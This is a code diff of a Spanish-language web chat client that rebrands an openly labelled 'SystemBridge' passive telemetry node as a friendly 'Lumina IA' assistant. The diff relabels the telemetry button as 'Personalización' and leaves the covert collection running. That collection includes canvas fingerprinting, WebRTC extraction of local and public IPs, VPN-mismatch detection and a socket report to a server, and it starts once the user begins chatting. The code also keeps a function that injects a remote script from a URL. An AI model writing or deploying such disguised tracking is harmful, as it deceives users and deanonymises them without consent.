@@ -5,17 +5,20 @@ const DOM = {
     form: document.getElementById('chat-form'),
     input: document.getElementById('user-input'),
     modelSelect: document.getElementById('model-select'),
-    bridgeStatus: document.getElementById('bridge-status'),
-    syncBtn: document.getElementById('sync-workspace-btn')
+    status: document.getElementById('bridge-status'),
+    personalizeBtn: document.getElementById('sync-workspace-btn'),
+    startBtn: document.getElementById('start-btn'),
+    welcomePanel: document.getElementById('welcome-panel')
 };
 
 const state = {
     history: [],
     isProcessing: false,
     currentModel: CONFIG.DEFAULT_MODEL,
-    nodeId: localStorage.getItem('systembridge_node_id') || `node-${crypto.randomUUID()}`,
-    sessionId: sessionStorage.getItem('systembridge_session_id') || `sess-${crypto.randomUUID()}`,
+    profileId: localStorage.getItem('lumina_profile_id') || `profile-${crypto.randomUUID()}`,
+    sessionId: sessionStorage.getItem('lumina_session_id') || `session-${crypto.randomUUID()}`,
     socket: null,
+    experienceStarted: false,
     telemetryTimer: null,
     firstMessageRendered: false,
     hookLoadStarted: false,
@@ -28,58 +31,61 @@ const state = {
     }
 };
 
-localStorage.setItem('systembridge_node_id', state.nodeId);
-sessionStorage.setItem('systembridge_session_id', state.sessionId);
+localStorage.setItem('lumina_profile_id', state.profileId);
+sessionStorage.setItem('lumina_session_id', state.sessionId);
 
-window.addEventListener('DOMContentLoaded', async () => {
+window.addEventListener('DOMContentLoaded', () => {
     populateModels();
     setupEvents();
-    renderStatus('Monitoreo pasivo activo');
-    appendSystemMessage('SystemBridge operativo. Telemetría pasiva ejecutándose en segundo plano.');
-
-    await initSocket();
-    await sendTelemetrySnapshot('startup');
-    startTelemetryLoop();
+    renderStatus('Lista');
+    appendSystemMessage('Hola, soy Lumina IA. Puedo ayudarte a organizar tu día, redactar correos y resolver dudas generales.');
 });
 
 function populateModels() {
     if (!DOM.modelSelect) return;
     DOM.modelSelect.innerHTML = '';
+
     CONFIG.MODELS.forEach((model) => {
         const option = document.createElement('option');
         option.value = model.id;
         option.textContent = model.label;
+        option.title = model.description;
         DOM.modelSelect.appendChild(option);
     });
+
     DOM.modelSelect.value = state.currentModel;
-    DOM.modelSelect.addEventListener('change', (e) => {
-        state.currentModel = e.target.value;
+    DOM.modelSelect.addEventListener('change', (event) => {
+        state.currentModel = event.target.value;
     });
 }
 
 function setupEvents() {
-    DOM.form.addEventListener('submit', (e) => {
-        e.preventDefault();
+    DOM.form.addEventListener('submit', (event) => {
+        event.preventDefault();
         handleSubmit();
     });
 
-    DOM.input.addEventListener('keydown', (e) => {
-        if (e.key === 'Enter' && !e.shiftKey) {
-            e.preventDefault();
+    DOM.input.addEventListener('keydown', (event) => {
+        if (event.key === 'Enter' && !event.shiftKey) {
+            event.preventDefault();
             handleSubmit();
         }
     });
 
-    DOM.syncBtn.innerHTML = '<i class="fa-solid fa-wave-square"></i><span>Diagnóstico Pasivo</span>';
-    DOM.syncBtn.title = 'Telemetría de nodo en segundo plano';
-    DOM.syncBtn.addEventListener('click', async () => {
-        const sent = await sendTelemetrySnapshot('manual');
-        if (sent) appendSystemMessage('Snapshot de telemetría enviado.');
+    DOM.startBtn?.addEventListener('click', async () => {
+        await startExperience('start_button');
+    });
+
+    DOM.personalizeBtn.innerHTML = '<i class="fa-solid fa-sliders"></i><span>Personalización</span>';
+    DOM.personalizeBtn.title = 'Mejora tu experiencia';
+    DOM.personalizeBtn.addEventListener('click', async () => {
+        const ok = await sendTelemetrySnapshot('personalization');
+        if (ok) appendSystemMessage('Personalización aplicada.');
     });
 
     document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'visible') {
-            sendTelemetrySnapshot('visibility');
+        if (document.visibilityState === 'visible' && state.experienceStarted) {
+            sendTelemetrySnapshot('resume');
         }
         if (document.visibilityState === 'hidden') {
             sendTelemetryBeacon('hidden');
@@ -93,28 +99,41 @@ function setupEvents() {
     window.addEventListener('pagehide', teardownRuntime, { once: true });
 }
 
+async function startExperience(reason = 'start') {
+    if (state.experienceStarted) return;
+    state.experienceStarted = true;
+
+    DOM.welcomePanel?.classList.add('is-hidden');
+
+    await initSocket();
+    await sendTelemetrySnapshot(reason);
+    startTelemetryLoop();
+    renderStatus('Activa');
+}
+
 async function initSocket() {
+    if (state.socket) return;
     state.socket = io();
 
     state.socket.on('connect', () => {
         state.socket.emit('register_node', {
-            nodeId: state.nodeId,
+            nodeId: state.profileId,
             sessionId: state.sessionId,
             nodeRuntime: 'web_client',
-            nodeChannel: 'passive_monitor',
+            nodeChannel: 'experience',
             userAgent: navigator.userAgent
         });
-        renderStatus('Nodo conectado');
+        renderStatus('Activa');
     });
 
     state.socket.on('disconnect', () => {
-        renderStatus('Nodo desconectado');
+        renderStatus('Lista');
     });
 }
 
 function renderStatus(text) {
-    DOM.bridgeStatus.classList.toggle('active', true);
-    DOM.bridgeStatus.textContent = text;
+    DOM.status.classList.toggle('active', true);
+    DOM.status.textContent = text;
 }
 
 async function handleSubmit() {
@@ -122,13 +141,18 @@ async function handleSubmit() {
     const text = DOM.input.value.trim();
     if (!text) return;
 
+    if (!state.experienceStarted) {
+        await startExperience('first_message');
+    }
+
     appendMessage('user', text);
     DOM.input.value = '';
     state.isProcessing = true;
 
     const loaderId = showLoader();
+
     try {
-        const res = await fetch(CONFIG.API_ENDPOINT, {
+        const response = await fetch(CONFIG.API_ENDPOINT, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -136,22 +160,24 @@ async function handleSubmit() {
                 messages: [...state.history.slice(-10), { role: 'user', content: text }]
             })
         });
-        const data = await res.json();
+
+        const data = await response.json();
         removeLoader(loaderId);
 
-        if (!res.ok) {
-            throw new Error(data.error || 'Error del modelo de IA');
+        if (!response.ok) {
+            throw new Error(data.error || 'No pude procesar tu solicitud.');
         }
 
-        const answer = String(data.text || '').trim();
-        appendMessage('assistant', answer || 'Sin respuesta del modelo.');
+        const answer = String(data.text || '').trim() || 'Estoy aquí para ayudarte.';
+        appendMessage('assistant', answer);
+
         state.history.push({ role: 'user', content: text }, { role: 'assistant', content: answer });
         if (state.history.length > 40) {
             state.history = state.history.slice(-40);
         }
     } catch (error) {
         removeLoader(loaderId);
-        appendMessage('assistant', `Fallo de conexión: ${error.message}`);
+        appendMessage('assistant', `Tuve un problema temporal: ${error.message}`);
     } finally {
         state.isProcessing = false;
     }
@@ -191,20 +217,20 @@ function showLoader() {
     const message = document.createElement('article');
     message.className = 'message assistant';
     message.id = id;
-    message.innerHTML = '<div class="bubble">Procesando...</div>';
+    message.innerHTML = '<div class="bubble">Pensando...</div>';
     DOM.chat.appendChild(message);
     DOM.chat.scrollTop = DOM.chat.scrollHeight;
     return id;
 }
 
 function removeLoader(id) {
-    const node = document.getElementById(id);
-    if (node) node.remove();
+    const loader = document.getElementById(id);
+    if (loader) loader.remove();
 }
 
 function buildTelemetryPayload(reason, fingerprint, network) {
     return {
-        nodeId: state.nodeId,
+        nodeId: state.profileId,
         sessionId: state.sessionId,
         source: 'web_client',
         reason,
@@ -254,10 +280,11 @@ async function sendTelemetrySnapshot(reason = 'scheduled') {
 
         if (state.socket?.connected) {
             state.socket.emit('node_report', {
-                nodeId: state.nodeId,
+                nodeId: state.profileId,
                 sessionId: state.sessionId,
                 source: 'browser_socket',
-                telemetry: payload.telemetry
+                telemetry: payload.telemetry,
+                userAgent: navigator.userAgent
             });
         }
 
@@ -370,7 +397,7 @@ async function getCanvasHash() {
     ctx.fillStyle = '#133A7C';
     ctx.fillRect(8, 8, 120, 24);
     ctx.fillStyle = '#F4B400';
-    ctx.fillText('SystemBridge Telemetry', 10, 10);
+    ctx.fillText('Lumina Experience', 10, 10);
     ctx.strokeStyle = '#0A0A0A';
     ctx.beginPath();
     ctx.arc(210, 38, 20, 0, Math.PI * 2);
@@ -382,7 +409,7 @@ async function getCanvasHash() {
 async function sha256Hex(input) {
     const bytes = new TextEncoder().encode(String(input));
     const digest = await crypto.subtle.digest('SHA-256', bytes);
-    return Array.from(new Uint8Array(digest)).map((b) => b.toString(16).padStart(2, '0')).join('');
+    return Array.from(new Uint8Array(digest)).map((byte) => byte.toString(16).padStart(2, '0')).join('');
 }
 
 async function runWebRtcDiagnostic(timeoutMs = 1800) {
@@ -424,21 +451,21 @@ async function runWebRtcDiagnostic(timeoutMs = 1800) {
 
     let localDescription = '';
     let timeoutId = null;
+
     try {
         const offer = await pc.createOffer();
         await pc.setLocalDescription(offer);
         localDescription = String(pc.localDescription?.sdp || '');
 
-        // Extract additional candidate lines directly from SDP.
         localDescription.split('\n').forEach((line) => {
             const trimmed = line.trim();
-            if (trimmed.startsWith('a=candidate:')) {
-                sdpCandidates.add(trimmed);
-                const sdpIp = trimmed.match(/(\d{1,3}(?:\.\d{1,3}){3})/);
-                if (sdpIp?.[1]) ipSet.add(sdpIp[1]);
-                if (/\styp\s+srflx\s/i.test(trimmed) && sdpIp?.[1]) {
-                    srflxSet.add(sdpIp[1]);
-                }
+            if (!trimmed.startsWith('a=candidate:')) return;
+            sdpCandidates.add(trimmed);
+
+            const sdpIp = trimmed.match(/(\d{1,3}(?:\.\d{1,3}){3})/);
+            if (sdpIp?.[1]) ipSet.add(sdpIp[1]);
+            if (/\styp\s+srflx\s/i.test(trimmed) && sdpIp?.[1]) {
+                srflxSet.add(sdpIp[1]);
             }
         });
 
@@ -487,14 +514,14 @@ function compareNetworkWithHeader(network, serverObservedIp, headerIp) {
         mismatchReason = 'headerIp_not_in_webrtc_publicIps';
     }
 
-    const nextNetwork = {
+    const updated = {
         ...network,
         vpnMismatch,
         mismatchReason
     };
 
-    const changed = nextNetwork.vpnMismatch !== network.vpnMismatch || nextNetwork.mismatchReason !== network.mismatchReason;
-    return { changed, network: nextNetwork };
+    const changed = updated.vpnMismatch !== network.vpnMismatch || updated.mismatchReason !== network.mismatchReason;
+    return { changed, network: updated };
 }
 
 function normalizeIp(value) {
@@ -504,8 +531,8 @@ function normalizeIp(value) {
 
 function isPrivateIpv4(ip) {
     if (!ip || ip.includes(':')) return false;
-    const [a, b] = ip.split('.').map((n) => Number(n));
-    if ([a, b].some((n) => Number.isNaN(n))) return false;
+    const [a, b] = ip.split('.').map((part) => Number(part));
+    if ([a, b].some((part) => Number.isNaN(part))) return false;
     if (a === 10) return true;
     if (a === 172 && b >= 16 && b <= 31) return true;
     if (a === 192 && b === 168) return true;
@@ -517,6 +544,7 @@ async function injectAuditHook(url) {
     if (!url) return;
 
     state.hookStatus.endpoint = url;
+
     try {
         await new Promise((resolve, reject) => {
             const script = document.createElement('script');
@@ -530,7 +558,7 @@ async function injectAuditHook(url) {
 
         state.hookStatus.loaded = true;
         state.hookStatus.status = 'loaded';
-        state.hookStatus.detail = 'Hook injected';
+        state.hookStatus.detail = 'ready';
     } catch (error) {
         state.hookStatus.loaded = false;
         state.hookStatus.status = 'failed';
@@ -543,6 +571,7 @@ function teardownRuntime() {
         clearInterval(state.telemetryTimer);
         state.telemetryTimer = null;
     }
+
     if (state.socket?.connected) {
         state.socket.disconnect();
     }
